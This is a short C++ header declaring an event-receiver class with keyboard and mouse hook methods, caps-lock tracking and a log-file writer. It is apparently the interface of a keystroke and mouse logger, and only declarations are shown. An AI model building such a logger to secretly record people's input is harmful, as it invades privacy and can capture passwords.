#ifndef EVENT_RECEIVER_H_
#define EVENT_RECEIVER_H_

#include <iostream>
#include <fstream>

enum eventOrigine
{
	KEYBOARD = 1,
	MOUSE = 2
};

enum mouseOrigine
{
	MOUSE_LEFT = 1,
	MOUSE_RIGHT = 2,
	MOUSE_CENTER = 3
};

class eventReceiver
{
private:
	bool			_capsLock;

public:

	eventReceiver();
	~eventReceiver();
	void		hookKey();
	void		hookMouse();
	void		writeLogfile(int, std::string, char, std::string, bool);
	bool		keyIsListed(int);
};

#endif // !EVENT_RECEIVER_H_